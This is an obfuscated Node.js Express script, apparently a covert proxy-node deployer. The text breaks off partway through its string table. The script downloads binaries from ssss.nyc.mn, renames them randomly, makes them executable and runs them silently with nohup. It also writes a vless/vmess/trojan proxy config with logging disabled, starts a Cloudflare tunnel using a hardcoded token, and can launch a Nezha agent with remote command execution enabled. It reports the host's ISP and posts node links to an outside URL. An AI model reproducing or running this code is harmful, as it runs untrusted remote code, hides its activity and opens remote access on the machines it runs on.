const _0x97f47c=_0xc19f;(function(_0x4152b0,_0x10c0f0){const _0x431d4b={_0x444c12:0xc1,_0x37b6f7:0xd2,_0x302e20:0x6f,_0x2deeb0:0x122,_0x1d53f8:0x96,_0x4229ac:0xc9},_0x3cc0d3=_0xc19f,_0x26f412=_0x4152b0();while(!![]){try{const _0x310fb5=parseInt(_0x3cc0d3(0xa3))/0x1*(parseInt(_0x3cc0d3(0xcb))/0x2)+parseInt(_0x3cc0d3(_0x431d4b._0x444c12))/0x3*(parseInt(_0x3cc0d3(0x12c))/0x4)+-parseInt(_0x3cc0d3(_0x431d4b._0x37b6f7))/0x5+-parseInt(_0x3cc0d3(_0x431d4b._0x302e20))/0x6*(parseInt(_0x3cc0d3(_0x431d4b._0x2deeb0))/0x7)+-parseInt(_0x3cc0d3(_0x431d4b._0x1d53f8))/0x8*(-parseInt(_0x3cc0d3(_0x431d4b._0x4229ac))/0x9)+-parseInt(_0x3cc0d3(0xf4))/0xa*(-parseInt(_0x3cc0d3(0xae))/0xb)+-parseInt(_0x3cc0d3(0xe7))/0xc;if(_0x310fb5===_0x10c0f0)break;else _0x26f412['push'](_0x26f412['shift']());}catch(_0x1cbcc1){_0x26f412['push'](_0x26f412['shift']());}}}(_0x40b6,0xe7984));const express=require(_0x97f47c(0xe6)),app=express(),axios=require(_0x97f47c(0x118)),os=require('os'),fs=require('fs'),path=require(_0x97f47c(0x114)),{promisify}=require('util'),exec=promisify(require(_0x97f47c(0xb0))[_0x97f47c(0x107)]),UPLOAD_URL=process[_0x97f47c(0x9a)]['UPLOAD_URL']||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x97f47c(0x102)]||![],FILE_PATH=process['env'][_0x97f47c(0xa5)]||_0x97f47c(0xa6),SUB_PATH=process['env'][_0x97f47c(0xb8)]||_0x97f47c(0x11b),PORT=process['env']['SERVER_PORT']||process[_0x97f47c(0x9a)]['PORT']||0xbb8,UUID=process[_0x97f47c(0x9a)]['UUID']||_0x97f47c(0xee),NEZHA_SERVER=process[_0x97f47c(0x9a)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x97f47c(0x9a)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x97f47c(0x9a)][_0x97f47c(0x10e)]||'',ARGO_DOMAIN=process[_0x97f47c(0x9a)][_0x97f47c(0x7e)]||_0x97f47c(0xa4),ARGO_AUTH=process[_0x97f47c(0x9a)][_0x97f47c(0x8c)]||'eyJhIjoiYTBhNGUxYzQwYjBkYTdkODUyNWQ1MjI1YjllMzg0NDYiLCJ0IjoiYTUyY2QyYWYtZjdhNC00MDE2LWI4OGQtNDRlNTNlOWQyNDUxIiwicyI6Ik1qUXpaV1kzWkRjdFlXVmtaaTAwWWpNeExXRTNOVFl0TmpneFlUazROek5sTVdGayJ9',ARGO_PORT=process[_0x97f47c(0x9a)]['ARGO_PORT']||0x1f41,CFIP=process[_0x97f47c(0x9a)]['CFIP']||_0x97f47c(0xfa),CFPORT=process[_0x97f47c(0x9a)]['CFPORT']||0x1bb,NAME=process[_0x97f47c(0x9a)][_0x97f47c(0x87)]||'';!fs[_0x97f47c(0xd1)](FILE_PATH)?(fs[_0x97f47c(0x105)](FILE_PATH),console[_0x97f47c(0x95)](FILE_PATH+_0x97f47c(0x8e))):console[_0x97f47c(0x95)](FILE_PATH+_0x97f47c(0xf1));function _0xc19f(_0x4a11b7,_0x2dae79){const _0x40b614=_0x40b6();return _0xc19f=function(_0xc19f02,_0xb601be){_0xc19f02=_0xc19f02-0x65;let _0x43116d=_0x40b614[_0xc19f02];return _0x43116d;},_0xc19f(_0x4a11b7,_0x2dae79);}function generateRandomName(){const _0x23f57f={_0x3889ea:0x10a},_0x25eb2a=_0x97f47c,_0x2a32de=_0x25eb2a(0x94);let _0x31447e='';for(let _0x27650f=0x0;_0x27650f<0x6;_0x27650f++){_0x31447e+=_0x2a32de[_0x25eb2a(0x10b)](Math[_0x25eb2a(0xaf)](Math[_0x25eb2a(0xef)]()*_0x2a32de[_0x25eb2a(_0x23f57f._0x3889ea)]));}return _0x31447e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x97f47c(0xaa)](FILE_PATH,npmName),phpPath=path[_0x97f47c(0xaa)](FILE_PATH,phpName),webPath=path[_0x97f47c(0xaa)](FILE_PATH,webName),botPath=path[_0x97f47c(0xaa)](FILE_PATH,botName),subPath=path[_0x97f47c(0xaa)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x97f47c(0x89)),bootLogPath=path[_0x97f47c(0xaa)](FILE_PATH,_0x97f47c(0x8b)),configPath=path[_0x97f47c(0xaa)](FILE_PATH,_0x97f47c(0x70));function deleteNodes(){const _0xd057a6={_0x5df1ce:0xad,_0x2d0f96:0xcf,_0x420f86:0xbe,_0x187167:0xc0,_0x447b99:0x10a,_0x547309:0xf2,_0x160d90:0x6d,_0x3c0601:0x77},_0x4ed3c2=_0x97f47c;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x448229;try{_0x448229=fs[_0x4ed3c2(_0xd057a6._0x5df1ce)](subPath,_0x4ed3c2(0xe0));}catch{return null;}const _0x4180d6=Buffer[_0x4ed3c2(_0xd057a6._0x2d0f96)](_0x448229,_0x4ed3c2(_0xd057a6._0x420f86))[_0x4ed3c2(_0xd057a6._0x187167)](_0x4ed3c2(0xe0)),_0x5ba64a=_0x4180d6['split']('\x0a')['filter'](_0x23b023=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x23b023));if(_0x5ba64a[_0x4ed3c2(_0xd057a6._0x447b99)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x4ed3c2(_0xd057a6._0x547309)]({'nodes':_0x5ba64a}),{'headers':{'Content-Type':_0x4ed3c2(_0xd057a6._0x160d90)}})[_0x4ed3c2(_0xd057a6._0x3c0601)](_0x27ba97=>{return null;}),null;}catch(_0x5c5b7b){return null;}}function cleanupOldFiles(){const _0x212c8b={_0x1cf578:0x126},_0x49fc68={_0x29ff2e:0xaa,_0x4b9f2e:0xea},_0x362329=_0x97f47c;try{const _0x3e6f32=fs[_0x362329(0xed)](FILE_PATH);_0x3e6f32[_0x362329(_0x212c8b._0x1cf578)](_0x144767=>{const _0x40462e=_0x362329,_0x71761b=path[_0x40462e(_0x49fc68._0x29ff2e)](FILE_PATH,_0x144767);try{const _0x95de65=fs[_0x40462e(0x6b)](_0x71761b);_0x95de65[_0x40462e(0xd8)]()&&fs[_0x40462e(_0x49fc68._0x4b9f2e)](_0x71761b);}catch(_0x2a50fe){}});}catch(_0x1f2b6e){}}async function generateConfig(){const _0x3f74a0={_0x3b1adc:0xc4,_0x4f943a:0x100,_0x3df166:0xb2,_0x142300:0x81,_0x94ebf9:0xb4,_0x5af5c7:0x111,_0x544e28:0x82,_0x4f6450:0xac,_0x39b9a6:0x88,_0x33394d:0xbd,_0x148b8b:0xdd,_0x28c7a2:0xdb},_0x3fce28=_0x97f47c,_0x3074ab={'log':{'access':_0x3fce28(0xc5),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3fce28(0x6a),'settings':{'clients':[{'id':UUID,'flow':_0x3fce28(0x72)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x3fce28(0x81),'dest':0xbba},{'path':_0x3fce28(_0x3f74a0._0x3b1adc),'dest':0xbbb},{'path':_0x3fce28(0x82),'dest':0xbbc}]},'streamSettings':{'network':_0x3fce28(0x100)}},{'port':0xbb9,'listen':_0x3fce28(0xd3),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x3fce28(_0x3f74a0._0x4f943a),'security':_0x3fce28(_0x3f74a0._0x3df166)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x3fce28(0x6a),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3fce28(0xb2)},'streamSettings':{'network':'ws','security':_0x3fce28(0xb2),'wsSettings':{'path':_0x3fce28(_0x3f74a0._0x142300)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3fce28(_0x3f74a0._0x94ebf9),_0x3fce28(_0x3f74a0._0x5af5c7)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x3fce28(0xac),_0x3fce28(_0x3f74a0._0x94ebf9),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x3fce28(0x11d),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3fce28(0xb2),'wsSettings':{'path':_0x3fce28(_0x3f74a0._0x544e28)}},'sniffing':{'enabled':!![],'destOverride':[_0x3fce28(_0x3f74a0._0x4f6450),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x3fce28(_0x3f74a0._0x39b9a6)]},'outbounds':[{'protocol':_0x3fce28(_0x3f74a0._0x33394d),'tag':_0x3fce28(_0x3f74a0._0x148b8b)},{'protocol':_0x3fce28(_0x3f74a0._0x28c7a2),'tag':_0x3fce28(0x12b)}]};fs[_0x3fce28(0x76)](path[_0x3fce28(0xaa)](FILE_PATH,'config.json'),JSON['stringify'](_0x3074ab,null,0x2));}function getSystemArchitecture(){const _0x43e829={_0x4389e6:0xfb,_0x2ee7cd:0xe2},_0x59baa8=_0x97f47c,_0x20cbda=os[_0x59baa8(0x9d)]();return _0x20cbda===_0x59baa8(0xe2)||_0x20cbda===_0x59baa8(_0x43e829._0x4389e6)||_0x20cbda===_0x59baa8(0xf3)?_0x59baa8(_0x43e829._0x2ee7cd):'amd';}function downloadFile(_0x27b2cb,_0x3dba5c,_0x476c9b){const _0x1e0d12={_0x12d140:0x123,_0xa5b2d5:0x77},_0x160878={_0x27a5a7:0x7a,_0x2a36cc:0x8f},_0x2d4e97={_0x2f5c87:0xd4,_0x32502c:0x124,_0x250460:0xda},_0x11ca0f={_0x13051b:0x95,_0x3dbfe5:0x119},_0x140a73=_0x97f47c,_0x5694dc=_0x27b2cb;!fs['existsSync'](FILE_PATH)&&fs[_0x140a73(0x105)](FILE_PATH,{'recursive':!![]});const _0x16f184=fs['createWriteStream'](_0x5694dc);axios({'method':_0x140a73(0xa8),'url':_0x3dba5c,'responseType':_0x140a73(_0x1e0d12._0x12d140)})[_0x140a73(0x11e)](_0x11ae5a=>{const _0x20f7d8=_0x140a73;_0x11ae5a[_0x20f7d8(_0x2d4e97._0x2f5c87)][_0x20f7d8(_0x2d4e97._0x32502c)](_0x16f184),_0x16f184['on'](_0x20f7d8(0x74),()=>{const _0x2bbe49=_0x20f7d8;_0x16f184['close'](),console[_0x2bbe49(_0x11ca0f._0x13051b)](_0x2bbe49(0x93)+path[_0x2bbe49(_0x11ca0f._0x3dbfe5)](_0x5694dc)+_0x2bbe49(0x129)),_0x476c9b(null,_0x5694dc);}),_0x16f184['on'](_0x20f7d8(_0x2d4e97._0x250460),_0x2fbfd8=>{const _0x275e7c=_0x20f7d8;fs[_0x275e7c(0x68)](_0x5694dc,()=>{});const _0x4e6253=_0x275e7c(0x93)+path[_0x275e7c(0x119)](_0x5694dc)+_0x275e7c(0x7a)+_0x2fbfd8[_0x275e7c(0x8f)];console[_0x275e7c(0xda)](_0x4e6253),_0x476c9b(_0x4e6253);});})[_0x140a73(_0x1e0d12._0xa5b2d5)](_0x53b973=>{const _0x58154b=_0x140a73,_0x6fce72=_0x58154b(0x93)+path[_0x58154b(0x119)](_0x5694dc)+_0x58154b(_0x160878._0x27a5a7)+_0x53b973[_0x58154b(_0x160878._0x2a36cc)];console['error'](_0x6fce72),_0x476c9b(_0x6fce72);});}async function downloadFilesAndRun(){const _0x10247c={_0x4134a2:0x95,_0x49c7cd:0x12a,_0x55f37e:0x130,_0x13b96e:0x83,_0x43c718:0x115,_0xdde71d:0x97,_0xcd8778:0x7f,_0x71e4d9:0xb5,_0x34602e:0xd9,_0x3962ee:0x98,_0x1bf7c7:0x9f,_0x2b8003:0xba,_0x82fc39:0xa7,_0x34933f:0x8d,_0x4e6f3e:0xf8,_0x10a825:0xb5,_0x6f638e:0x10f,_0xc1656c:0x65,_0x2f3a89:0x125,_0x1529de:0xdc,_0x56688f:0x120,_0x44d510:0x128,_0x17197d:0xbc,_0x29cda0:0xda,_0x5d954c:0x71,_0x29e404:0xd1,_0x443247:0xbf,_0x3d8838:0xfd,_0x3ced60:0xbb,_0x51d7d2:0xa7},_0x44e4c4={_0x2cc281:0x126},_0x382a41={_0x2294a5:0xd1},_0x3de65f=_0x97f47c,_0x409f29=getSystemArchitecture(),_0x588bf4=getFilesForArchitecture(_0x409f29);if(_0x588bf4[_0x3de65f(0x10a)]===0x0){console[_0x3de65f(_0x10247c._0x4134a2)](_0x3de65f(_0x10247c._0x49c7cd));return;}const _0x6306d7=_0x588bf4[_0x3de65f(_0x10247c._0x55f37e)](_0xc4a041=>{return new Promise((_0x4fbd7d,_0x1b1c83)=>{const _0x3d47bc=_0xc19f;downloadFile(_0xc4a041[_0x3d47bc(0x99)],_0xc4a041[_0x3d47bc(0xce)],(_0x26f2be,_0x53151a)=>{_0x26f2be?_0x1b1c83(_0x26f2be):_0x4fbd7d(_0x53151a);});});});try{await Promise[_0x3de65f(_0x10247c._0x13b96e)](_0x6306d7);}catch(_0x386635){console[_0x3de65f(0xda)](_0x3de65f(_0x10247c._0x43c718),_0x386635);return;}function _0x4b4dbd(_0x3bc683){const _0x5cf9e6={_0x1652ba:0xda,_0x4b8b8a:0xc0},_0x405493=_0x3de65f,_0x5b7b51=0x1fd;_0x3bc683[_0x405493(_0x44e4c4._0x2cc281)](_0x1c1bb7=>{const _0x44250c=_0x405493;fs[_0x44250c(_0x382a41._0x2294a5)](_0x1c1bb7)&&fs['chmod'](_0x1c1bb7,_0x5b7b51,_0x43744f=>{const _0x540e51=_0x44250c;_0x43744f?console[_0x540e51(_0x5cf9e6._0x1652ba)](_0x540e51(0x12d)+_0x1c1bb7+':\x20'+_0x43744f):console['log'](_0x540e51(0xff)+_0x1c1bb7+':\x20'+_0x5b7b51[_0x540e51(_0x5cf9e6._0x4b8b8a)](0x8));});});}const _0x2b5625=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4b4dbd(_0x2b5625);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1c6d84=NEZHA_SERVER[_0x3de65f(_0x10247c._0xdde71d)](':')?NEZHA_SERVER[_0x3de65f(_0x10247c._0xcd8778)](':')['pop']():'',_0x14ef82=new Set([_0x3de65f(_0x10247c._0x71e4d9),_0x3de65f(0x10f),_0x3de65f(_0x10247c._0x34602e),_0x3de65f(0x65),_0x3de65f(0x125),_0x3de65f(_0x10247c._0x3962ee)]),_0x26752e=_0x14ef82['has'](_0x1c6d84)?'true':_0x3de65f(0x9b),_0x27f097=_0x3de65f(0xf6)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x26752e+_0x3de65f(_0x10247c._0x1bf7c7)+UUID;fs[_0x3de65f(0x76)](path['join'](FILE_PATH,_0x3de65f(_0x10247c._0x2b8003)),_0x27f097);const _0x23c43c=_0x3de65f(_0x10247c._0x82fc39)+phpPath+_0x3de65f(_0x10247c._0x34933f)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x23c43c),console['log'](phpName+_0x3de65f(_0x10247c._0x4e6f3e)),await new Promise(_0x480e18=>setTimeout(_0x480e18,0x3e8));}catch(_0x32c0b2){console[_0x3de65f(0xda)](_0x3de65f(0xc3)+_0x32c0b2);}}else{let _0x1a9c0e='';const _0x5b1123=[_0x3de65f(_0x10247c._0x10a825),_0x3de65f(_0x10247c._0x6f638e),_0x3de65f(0xd9),_0x3de65f(_0x10247c._0xc1656c),_0x3de65f(_0x10247c._0x2f3a89),_0x3de65f(0x98)];_0x5b1123[_0x3de65f(_0x10247c._0xdde71d)](NEZHA_PORT)&&(_0x1a9c0e=_0x3de65f(0x12f));const _0x30da0c='nohup\x20'+npmPath+_0x3de65f(_0x10247c._0x1529de)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3de65f(_0x10247c._0x56688f)+NEZHA_KEY+'\x20'+_0x1a9c0e+_0x3de65f(_0x10247c._0x44d510);try{await exec(_0x30da0c),console[_0x3de65f(_0x10247c._0x4134a2)](npmName+'\x20is\x20running'),await new Promise(_0x1b0f79=>setTimeout(_0x1b0f79,0x3e8));}catch(_0x587e59){console['error'](_0x3de65f(0xcc)+_0x587e59);}}}else console['log'](_0x3de65f(_0x10247c._0x17197d));const _0x3545dc=_0x3de65f(0xa7)+webPath+_0x3de65f(0xfe)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3545dc),console['log'](webName+_0x3de65f(_0x10247c._0x4e6f3e)),await new Promise(_0x29787f=>setTimeout(_0x29787f,0x3e8));}catch(_0x59b230){console[_0x3de65f(_0x10247c._0x29cda0)](_0x3de65f(_0x10247c._0x5d954c)+_0x59b230);}if(fs[_0x3de65f(_0x10247c._0x29e404)](botPath)){let _0x3b141b;if(ARGO_AUTH[_0x3de65f(0x78)](/^[A-Z0-9a-z=]{120,250}$/))_0x3b141b=_0x3de65f(_0x10247c._0x443247)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x3b141b=_0x3de65f(_0x10247c._0x3d8838)+FILE_PATH+_0x3de65f(0x91):_0x3b141b=_0x3de65f(_0x10247c._0x3ced60)+FILE_PATH+_0x3de65f(0x106)+ARGO_PORT;try{await exec(_0x3de65f(_0x10247c._0x51d7d2)+botPath+'\x20'+_0x3b141b+'\x20>/dev/null\x202>&1\x20&'),console[_0x3de65f(0x95)](botName+_0x3de65f(0xf8)),await new Promise(_0x475e3b=>setTimeout(_0x475e3b,0x7d0));}catch(_0x56ffc6){console[_0x3de65f(_0x10247c._0x29cda0)]('Error\x20executing\x20command:\x20'+_0x56ffc6);}}await new Promise(_0x270f98=>setTimeout(_0x270f98,0x1388));}function getFilesForArchitecture(_0x175dd8){const _0x1b6943={_0x1a6643:0xe2,_0x2deac8:0xe2,_0x191741:0xc6,_0x4d582f:0x109,_0x2d086c:0xe2,_0x535d8d:0xe3,_0xefee72:0x109},_0x138725=_0x97f47c;let _0x210f9a;_0x175dd8===_0x138725(_0x1b6943._0x1a6643)?_0x210f9a=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x138725(0xb9)}]:_0x210f9a=[{'fileName':webPath,'fileUrl':_0x138725(0xeb)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x22f559=_0x175dd8===_0x138725(_0x1b6943._0x2deac8)?'https://arm64.ssss.nyc.mn/agent':_0x138725(_0x1b6943._0x191741);_0x210f9a[_0x138725(_0x1b6943._0x4d582f)]({'fileName':npmPath,'fileUrl':_0x22f559});}else{const _0x2127d3=_0x175dd8===_0x138725(_0x1b6943._0x2d086c)?_0x138725(0x127):_0x138725(_0x1b6943._0x535d8d);_0x210f9a[_0x138725(_0x1b6943._0xefee72)]({'fileName':phpPath,'fileUrl':_0x2127d3});}}return _0x210f9a;}function argoType(){const _0x529117={_0x538798:0xd7,_0x2edee4:0xf9,_0x2c9e7d:0xa0,_0x132b99:0xaa},_0x558230=_0x97f47c;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x558230(0xfc));return;}if(ARGO_AUTH['includes'](_0x558230(_0x529117._0x538798))){fs[_0x558230(0x76)](path['join'](FILE_PATH,_0x558230(0xe8)),ARGO_AUTH);const _0x245d1f=_0x558230(_0x529117._0x2edee4)+ARGO_AUTH[_0x558230(0x7f)]('\x22')[0xb]+_0x558230(0xb3)+path['join'](FILE_PATH,_0x558230(0xe8))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x558230(_0x529117._0x2c9e7d)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x558230(0x76)](path[_0x558230(_0x529117._0x132b99)](FILE_PATH,_0x558230(0x90)),_0x245d1f);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x35f41a={_0x2e5b01:0x7d,_0x1dc3d6:0xe0,_0x8e003b:0x95},_0x202261={_0xa70163:0xa8,_0x453b2b:0xe1,_0x5529c8:0xd4,_0x2fd027:0xd0,_0x745826:0x110,_0x162855:0xd4,_0x34bb3f:0x7c,_0x3e128a:0xc8},_0x4d8001={_0x437c01:0x10c,_0x3b959d:0xdf,_0x4de019:0x85},_0x2a5500={_0x490141:0x78},_0x24241b=_0x97f47c;let _0x4e54a8;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4e54a8=ARGO_DOMAIN,console[_0x24241b(0x95)](_0x24241b(_0x35f41a._0x2e5b01),_0x4e54a8),await _0x40fc8b(_0x4e54a8);else try{const _0x232c15=fs['readFileSync'](path[_0x24241b(0xaa)](FILE_PATH,'boot.log'),_0x24241b(_0x35f41a._0x1dc3d6)),_0x195bce=_0x232c15['split']('\x0a'),_0x3895d2=[];_0x195bce['forEach'](_0x554965=>{const _0x53ee42=_0x24241b,_0x2f5def=_0x554965[_0x53ee42(_0x2a5500._0x490141)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2f5def){const _0x49a32a=_0x2f5def[0x1];_0x3895d2[_0x53ee42(0x104)](_0x49a32a);}});if(_0x3895d2['length']>0x0)_0x4e54a8=_0x3895d2[0x0],console[_0x24241b(0x95)](_0x24241b(0xa1),_0x4e54a8),await _0x40fc8b(_0x4e54a8);else{console[_0x24241b(0x95)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path['join'](FILE_PATH,'boot.log'));async function _0x129fd3(){const _0x1ad599=_0x24241b;try{process[_0x1ad599(0x11c)]===_0x1ad599(_0x4d8001._0x437c01)?await exec(_0x1ad599(_0x4d8001._0x3b959d)+botName+_0x1ad599(0x6e)):await exec(_0x1ad599(_0x4d8001._0x4de019)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x1ad599(0x108));}catch(_0x1adff1){}}_0x129fd3(),await new Promise(_0x456eaa=>setTimeout(_0x456eaa,0xbb8));const _0x49edf1='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x49edf1+'\x20>/dev/null\x202>&1\x20&'),console[_0x24241b(_0x35f41a._0x8e003b)](botName+_0x24241b(0xf8)),await new Promise(_0x1c15ee=>setTimeout(_0x1c15ee,0xbb8)),await extractDomains();}catch(_0x2ab48d){console[_0x24241b(0xda)](_0x24241b(0x8a)+_0x2ab48d);}}}catch(_0x142dc7){console[_0x24241b(0xda)](_0x24241b(0xe5),_0x142dc7);}async function _0xd539a3(){const _0x5daf6c=_0x24241b;try{const _0x1b5678=await axios[_0x5daf6c(_0x202261._0xa70163)](_0x5daf6c(_0x202261._0x453b2b),{'headers':{'User-Agent':_0x5daf6c(0x11a),'timeout':0xbb8}});if(_0x1b5678[_0x5daf6c(0xd4)]&&_0x1b5678['data'][_0x5daf6c(0xec)]&&_0x1b5678[_0x5daf6c(0xd4)][_0x5daf6c(0xd0)])return(_0x1b5678[_0x5daf6c(_0x202261._0x5529c8)][_0x5daf6c(0xec)]+'-'+_0x1b5678[_0x5daf6c(_0x202261._0x5529c8)][_0x5daf6c(_0x202261._0x2fd027)])[_0x5daf6c(_0x202261._0x745826)](/\s+/g,'_');}catch(_0x1ba0bb){try{const _0x342096=await axios[_0x5daf6c(0xa8)]('http://ip-api.com/json',{'headers':{'User-Agent':'Mozilla/5.0','timeout':0xbb8}});if(_0x342096[_0x5daf6c(0xd4)]&&_0x342096[_0x5daf6c(0xd4)][_0x5daf6c(0x6c)]===_0x5daf6c(0x121)&&_0x342096[_0x5daf6c(_0x202261._0x162855)][_0x5daf6c(_0x202261._0x34bb3f)]&&_0x342096[_0x5daf6c(_0x202261._0x5529c8)][_0x5daf6c(_0x202261._0x3e128a)])return(_0x342096['data'][_0x5daf6c(0x7c)]+'-'+_0x342096[_0x5daf6c(0xd4)][_0x5daf6c(0xc8)])[_0x5daf6c(0x110)](/\s+/g,'_');}catch(_0x24066b){}}return _0x5daf6c(0x75);}async function _0x40fc8b(_0x4fe268){const _0x1204ad=await _0xd539a3(),_0x5196b9=NAME?NAME+'-'+_0x1204ad:_0x1204ad;return new Promise(_0x198cc6=>{const _0xba65c2={_0x477eb3:0xd5,_0x363d2a:0xa9,_0x130a3d:0xc7,_0x3fc61f:0xcf,_0x231a4f:0xf2,_0x5cf347:0xbe,_0xd6f17a:0xe9,_0xd063aa:0x12e,_0x13741f:0x95,_0x19d90b:0x76,_0x366636:0xc0,_0x5f21b7:0x95},_0x31fcb6={_0x528a1c:0xcf,_0x46d8a3:0xc0,_0x3b83b0:0xbe,_0x36888d:0x80};setTimeout(()=>{const _0xc68cd2=_0xc19f,_0x55bd8d={'v':'2','ps':''+_0x5196b9,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xc68cd2(_0xba65c2._0x477eb3),'net':'ws','type':'none','host':_0x4fe268,'path':_0xc68cd2(0x116),'tls':'tls','sni':_0x4fe268,'alpn':'','fp':'firefox'},_0x2f6299=_0xc68cd2(_0xba65c2._0x363d2a)+UUID+'@'+CFIP+':'+CFPORT+_0xc68cd2(0x9c)+_0x4fe268+_0xc68cd2(_0xba65c2._0x130a3d)+_0x4fe268+_0xc68cd2(0xb1)+_0x5196b9+_0xc68cd2(0x69)+Buffer[_0xc68cd2(_0xba65c2._0x3fc61f)](JSON[_0xc68cd2(_0xba65c2._0x231a4f)](_0x55bd8d))['toString'](_0xc68cd2(_0xba65c2._0x5cf347))+_0xc68cd2(0x9e)+UUID+'@'+CFIP+':'+CFPORT+_0xc68cd2(_0xba65c2._0xd6f17a)+_0x4fe268+_0xc68cd2(0xc7)+_0x4fe268+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x5196b9+_0xc68cd2(_0xba65c2._0xd063aa);console[_0xc68cd2(_0xba65c2._0x13741f)](Buffer[_0xc68cd2(0xcf)](_0x2f6299)[_0xc68cd2(0xc0)](_0xc68cd2(0xbe))),fs[_0xc68cd2(_0xba65c2._0x19d90b)](subPath,Buffer[_0xc68cd2(0xcf)](_0x2f6299)[_0xc68cd2(_0xba65c2._0x366636)](_0xc68cd2(0xbe))),console[_0xc68cd2(_0xba65c2._0x5f21b7)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0xc68cd2(0xa8)]('/'+SUB_PATH,(_0x28f5ff,_0x50593d)=>{const _0x5f0fe5=_0xc68cd2,_0xc1dc=Buffer[_0x5f0fe5(_0x31fcb6._0x528a1c)](_0x2f6299)[_0x5f0fe5(_0x31fcb6._0x46d8a3)](_0x5f0fe5(_0x31fcb6._0x3b83b0));_0x50593d[_0x5f0fe5(_0x31fcb6._0x36888d)](_0x5f0fe5(0x101),_0x5f0fe5(0x113)),_0x50593d[_0x5f0fe5(0xf7)](_0xc1dc);}),_0x198cc6(_0x2f6299);},0x7d0);});}}function _0x40b6(){const _0x22fb93=['?encryption=none&security=tls&sni=','arch','\x0a\x0atrojan://','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','ArgoDomain:','readFile','51pBuTbb','fly888.king8888.nyc.mn','FILE_PATH','.tmp','nohup\x20','get','\x0avless://','join','post','http','readFileSync','22ruquea','floor','child_process','&path=%2Fvless-argo%3Fed%3D2560#','none','\x0a\x20\x20credentials-file:\x20','tls','443','Add\x20automatic\x20access\x20task\x20faild:\x20','/api/add-subscriptions','SUB_PATH','https://arm64.ssss.nyc.mn/bot','config.yaml','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','freedom','base64','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','toString','327VTUgaa','del\x20/f\x20/q\x20','php\x20running\x20error:\x20','/vmess-argo','/dev/null','https://amd64.ssss.nyc.mn/agent','&fp=firefox&type=ws&host=','org','8181nMRAQr','https://oooo.serv00.net/add-url','62158jQqDQT','npm\x20running\x20error:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','fileUrl','from','isp','existsSync','3285695edzVKB','127.0.0.1','data',